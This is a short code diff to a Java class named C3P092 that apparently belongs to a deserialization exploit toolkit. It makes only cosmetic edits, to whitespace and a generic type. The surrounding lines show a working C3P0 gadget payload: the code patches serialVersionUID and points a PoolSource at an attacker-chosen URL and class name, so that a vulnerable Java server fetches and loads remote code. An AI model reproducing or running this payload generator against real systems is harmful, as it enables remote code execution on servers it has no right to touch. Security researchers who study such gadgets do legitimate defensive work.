@@ -34,7 +34,7 @@ public class C3P092 implements ObjectPayload<Object> {
             throw new IllegalArgumentException("Command format is: <base_url>:<classname>");
         }
 
-        String url       = command.substring(0, sep);
+        String url = command.substring(0, sep);
         String className = command.substring(sep + 1);
 
         // 修改com.mchange.v2.c3p0.PoolBackedDataSource serialVerisonUID
@@ -46,7 +46,7 @@ public class C3P092 implements ObjectPayload<Object> {
         ClassFieldHandler.insertField(ctPoolBackedDataSource, "serialVersionUID", "private static final long serialVersionUID = 7387108436934414104L;");
 
         // mock method name until armed
-        final Class clsPoolBackedDataSource = ctPoolBackedDataSource.toClass(new SuClassLoader());
+        final Class<?> clsPoolBackedDataSource = ctPoolBackedDataSource.toClass(new SuClassLoader());
 
         Object b = Reflections.createWithoutConstructor(clsPoolBackedDataSource);
         Reflections.getField(clsPoolBackedDataSource, "connectionPoolDataSource").set(b, new PoolSource(className, url));
